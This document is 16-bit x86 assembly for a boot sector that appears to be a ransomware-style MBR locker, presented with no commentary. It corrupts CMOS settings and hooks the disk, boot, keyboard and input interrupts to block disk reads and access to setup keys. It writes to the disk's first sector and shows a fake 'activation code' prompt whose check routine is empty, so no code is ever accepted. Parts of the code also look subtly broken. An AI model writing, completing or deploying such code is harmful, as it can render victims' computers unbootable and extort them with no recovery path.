[BITS 16]
[ORG 0x7C00]

start:
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00

    call clear_screen

    mov ah, 0x01
    mov cx, 0x2000
    int 0x10

    cli

    call corrupt_cmos

    xor ax, ax
    mov es, ax
    mov ax, [es:13h*4]
    mov [old_int13], ax
    mov ax, [es:13h*4+2]
    mov [old_int13+2], ax

    mov ax, [es:19h*4]
    mov [old_int19], ax
    mov ax, [es:19h*4+2]
    mov [old_int19+2], ax

    mov ax, [es:09h*4]
    mov [old_int09], ax
    mov ax, [es:09h*4+2]
    mov [old_int09+2], ax

    mov ax, [es:16h*4]
    mov [old_int16], ax
    mov ax, [es:16h*4+2]
    mov [old_int16+2], ax

    mov word [es:13h*4], new_int13
    mov [es:13h*4+2], cs

    mov word [es:19h*4], new_int19
    mov [es:19h*4+2], cs

    mov word [es:09h*4], new_int09
    mov [es:09h*4+2], cs

    mov word [es:16h*4], new_int16
    mov [es:16h*4+2], cs

    mov si, 0x7C00
    mov di, 0xA000
    mov cx, 512
    rep movsb

    mov ax, 0x0301
    xor bx, bx
    mov cx, 1
    mov dx, 0x0000
    int 0x13

    jmp 0x0000:0xA000

main_loop:
    call display_activation_message

    call get_activation_code

    call verify_code

    call display_error_message

    call delay
    jmp main_loop

clear_screen:
    pusha
    mov ax, 0x0600
    xor bh, bh
    xor cx, cx
    mov dx, 0x184F
    int 0x10
    popa
    ret

display_activation_message:
    pusha
    mov ah, 0x02
    xor bh, bh
    mov dx, 0x0C00
    int 0x10

    mov si, activation_msg
    call print_string
    popa
    ret

get_activation_code:
    pusha
    mov di, input_buffer
    mov cx, 0x10
    xor bh, bh

input_loop:
    mov ah, 0x02
    mov dx, 0x0D00
    int 0x10

    mov ah, 0x00
    int 0x16

    cmp al, 0x0D
    je input_complete

    cmp al, 0x08
    je handle_backspace

    mov ah, 0x0E
    int 0x10

    stosb

    loop input_loop
    jmp input_complete

handle_backspace:
    cmp di, input_buffer
    je input_loop

    dec di

    mov ah, 0x02
    dec dl
    int 0x10

    mov ah, 0x0E
    mov al, ' '
    int 0x10

    mov ah, 0x02
    dec dl
    int 0x10

    jmp input_loop

input_complete:
    mov al, 0
    stosb
    popa
    ret

verify_code:
    pusha
    popa
    ret

display_error_message:
    pusha
    mov ah, 0x02
    xor bh, bh
    mov dx, 0x0F00
    int 0x10

    mov si, error_msg
    call print_string
    popa
    ret

corrupt_cmos:
    pusha
    mov al, 0x2D
    out 0x70, al
    mov al, 0xFF
    out 0x71, al

    mov al, 0x2E
    out 0x70, al
    mov al, 0xFF
    out 0x71, al

    mov al, 0x2F
    out 0x70, al
    mov al, 0xFF
    out 0x71, al

    mov al, 0x38
    out 0x70, al
    mov al, 0x00
    out 0x71, al

    mov al, 0x10
    out 0x70, al
    in al, 0x71
    or al, 0x80
    out 0x71, al
    popa
    ret

new_int13:
    pusha
    cmp ah, 0x02
    je block_read
    cmp ah, 0x42
    je block_read

    popa
    jmp far [cs:old_int13]

block_read:
    mov ax, 0x0000
    mov es, ax
    mov di, 0x7E00
    mov cx, 256
    xor al, al
    rep stosb
    popa
    ret

new_int19:
    pusha
    call corrupt_cmos
    jmp far [cs:old_int19]

new_int09:
    pusha
    in al, 0x60
    cmp al, 0x52
    je block_setup
    cmp al, 0x32
    je block_setup
    cmp al, 0x41
    je block_setup
    cmp al, 0x1B
    je block_setup
    mov al, 0x20
    out 0x20, al
    popa
    iret

block_setup:
    mov al, 0x20
    out 0x20, al
    popa
    iret

new_int16:
    pusha
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x0000
    mov cx, 0x0000
    mov dx, 0x0000
    mov si, 0x0000
    mov di, 0x0000
    popa
    iret

delay:
    pusha
    mov cx, 0xFFFF
    mov dx, 0xFFFF

delay_loop:
    dec dx
    jnz delay_loop
    dec cx
    jnz delay_loop
    popa
    ret

print_string:
    pusha
    mov ah, 0x0E

print_char:
    lodsb
    cmp al, 0
    je print_done
    int 0x10
    jmp print_char

print_done:
    popa
    ret

activation_msg db 'Please enter activation code:', 0
error_msg db 'Invalid activation code. Please try again.', 0
old_int13 dd 0
old_int19 dd 0
old_int09 dd 0
old_int16 dd 0
input_buffer resb 17

times (446 - ($ - $$)) db 0

db 0x55, 0xAA